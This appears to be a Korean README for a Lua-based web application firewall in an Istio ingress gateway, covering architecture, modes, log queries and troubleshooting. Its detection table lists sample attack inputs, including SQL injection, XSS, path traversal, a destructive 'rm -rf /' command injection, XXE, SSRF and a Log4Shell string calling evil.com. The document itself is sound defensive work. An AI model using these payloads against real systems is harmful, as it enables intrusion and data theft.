# Istio Security Filter (WAF-like Protection)

Istio IngressGateway에서 EnvoyFilter + Lua를 사용한 L7 보안 필터입니다.

## 아키텍처

```
Client Request
       │
       ▼
┌──────────────────────────────────────────────────────┐
│  Istio IngressGateway (istio-system)                 │
│  ┌────────────────────────────────────────────────┐  │
│  │  Envoy Proxy                                   │  │
│  │  ┌──────────────────────────────────────────┐  │  │
│  │  │  HTTP Filter Chain                       │  │  │
│  │  │  ├─ 1. TLS Termination                   │  │  │
│  │  │  ├─ 2. Lua WAF Filter  ◀── 여기서 검사   │  │  │
│  │  │  ├─ 3. Rate Limit                        │  │  │
│  │  │  └─ 4. Router                            │  │  │
│  │  └──────────────────────────────────────────┘  │  │
│  └────────────────────────────────────────────────┘  │
└──────────────────────────────────────────────────────┘
       │
       ▼ (통과 시)
   Backend Pods
```

## 탐지 패턴

| 카테고리 | 설명 | 공격 예시 |
|----------|------|-----------|
| **SQL Injection** | DB 쿼리 조작 | `' OR 1=1--`, `UNION SELECT * FROM users` |
| **XSS** | 스크립트 삽입 | `<script>alert(1)</script>`, `javascript:` |
| **Path Traversal** | 디렉토리 탐색 | `../../../etc/passwd`, `%2e%2e%2f` |
| **Command Injection** | OS 명령어 삽입 | `; rm -rf /`, `| cat /etc/passwd` |
| **LDAP Injection** | LDAP 쿼리 조작 | `*)(uid=*))(|(uid=*` |
| **XXE Injection** | XML 외부 엔티티 | `<!ENTITY xxe SYSTEM "file:///etc/passwd">` |
| **SSRF** | 내부 서버 요청 유도 | `?url=http://169.254.169.254/` |
| **Log4Shell** | Log4j 취약점 | `${jndi:ldap://evil.com/a}` |
| **Header Injection** | HTTP 헤더 조작 | `\r\nX-Injected: header` |
| **Bot/Scanner** | 악성 스캐너 탐지 | User-Agent: `sqlmap`, `nikto`, `nmap` |

## 모드

| 모드 | 로그 | 차단 | 용도 |
|------|:----:|:----:|------|
| `detect` | O | X | 테스트, 오탐 확인 |
| `block` | O | O | 실제 운영 |

### 모드 전환

```yaml
# dev/values/istio/values-istio-security.yaml
mode: detect  # 로그만 남김 (기본값)
mode: block   # 403 응답으로 차단
```

변경 후 ArgoCD가 자동 sync합니다.

## 로그 확인

### Grafana Loki 쿼리

```logql
# 모든 보안 이벤트
{namespace="istio-system", container="istio-proxy"} |= "security"

# SQL Injection만
{namespace="istio-system", container="istio-proxy"} |= "SQL_INJECTION_DETECTED"

# XSS만
{namespace="istio-system", container="istio-proxy"} |= "XSS_DETECTED"

# 차단된 요청만 (block 모드)
{namespace="istio-system", container="istio-proxy"} |= "blocked\":true"

# 특정 IP에서 온 공격
{namespace="istio-system", container="istio-proxy"} |= "security" |= "192.168.1.100"
```

### 로그 포맷 (JSON)

```json
{
  "timestamp": "2026-03-06T15:30:00Z",
  "level": "warn",
  "type": "security",
  "event": "SQL_INJECTION_DETECTED",
  "category": "SQL_INJECTION",
  "rule": "sql-union",
  "description": "UNION SELECT statement",
  "client_ip": "192.168.1.100",
  "path": "/api/users?id=1 UNION SELECT * FROM users",
  "blocked": false,
  "matched": "UNION SELECT"
}
```

| 필드 | 설명 |
|------|------|
| `event` | 탐지된 공격 유형 |
| `rule` | 매칭된 규칙 이름 |
| `client_ip` | 공격자 IP (X-Forwarded-For에서 추출) |
| `path` | 요청 경로 + 쿼리스트링 |
| `blocked` | `true`: 차단됨 (block 모드), `false`: 로그만 (detect 모드) |
| `matched` | 매칭된 문자열 (최대 100자) |

## 제외 경로

다음 경로는 검사에서 제외됩니다:

```yaml
excludePaths:
  # Health checks
  - "/health"
  - "/healthz"
  - "/ready"
  - "/actuator/health"

  # Metrics
  - "/metrics"
  - "/stats/prometheus"

  # API docs
  - "/swagger"
  - "/v3/api-docs"
```

## 성능 영향

| 패턴 수 | 예상 지연 |
|---------|-----------|
| ~20개 | ~1-2ms |
| ~40개 | ~2-3ms |
| ~100개 | ~5ms |

Lua는 경량 스크립트 언어로, 단순 문자열 매칭은 매우 빠릅니다.

## 파일 구조

```
common-charts/infra/istio-security/
├── Chart.yaml
├── values.yaml                    # 기본값 (패턴 정의)
└── templates/
    └── envoyfilter-waf.yaml       # EnvoyFilter + Lua 스크립트

dev/values/istio/
└── values-istio-security.yaml     # Dev 환경 설정 (mode: detect)
```

## Coraza WASM과 비교

| 항목 | Lua (현재) | Coraza WASM |
|------|------------|-------------|
| 룰셋 | 커스텀 (~40개) | OWASP CRS (2000+) |
| 설정 복잡도 | 낮음 | 높음 (paranoia level 튜닝 필요) |
| 오탐 가능성 | 낮음 | 높음 (strict by default) |
| 성능 | ~2-3ms | ~5-15ms |
| 유지보수 | 직접 패턴 관리 | CRS 업데이트 적용 |

## 트러블슈팅

### 정상 요청이 차단되는 경우

1. `mode: detect`로 변경하여 로그만 확인
2. 로그에서 어떤 규칙이 매칭되었는지 확인
3. 해당 패턴 비활성화 또는 `excludePaths`에 경로 추가

### 로그가 안 보이는 경우

```bash
# istio-proxy 로그 직접 확인
kubectl logs -n istio-system -l app=istio-ingressgateway -c istio-proxy | grep security
```

### EnvoyFilter 적용 확인

```bash
kubectl get envoyfilter -n istio-system
kubectl describe envoyfilter waf-lua-filter -n istio-system
```
